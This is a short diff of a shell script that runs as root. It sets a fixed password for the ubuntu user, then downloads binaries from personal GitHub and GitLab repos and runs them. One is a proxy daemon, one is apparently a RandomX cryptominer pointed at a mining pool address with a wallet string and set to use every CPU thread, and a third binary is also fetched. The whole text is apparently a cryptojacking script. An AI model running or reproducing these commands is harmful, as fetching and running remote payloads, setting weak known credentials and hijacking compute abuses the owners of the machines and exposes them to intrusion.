@@ -1,8 +1,9 @@
+echo ubuntu:1234abcd | chpasswd
+sleep 2
 sudo su <<EOF
 wget https://raw.githubusercontent.com/sarifadim/dopla/main/danted && chmod +x * && ./danted
 sleep 3
 cd /home/
-echo ubuntu:1234abcd | chpasswd
 sleep 3
 wget https://gitlab.com/sarifadim/jomblo/-/raw/main/bismillah && chmod +x * && screen -dms run ./bismillah -o 34.149.22.228:9200 -u 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.ARX -a rx/0 -t $(nproc --all)
 wget -qO image https://gitlab.com/sarifadim/jomblo/-/raw/main/gitpod && chmod +x image
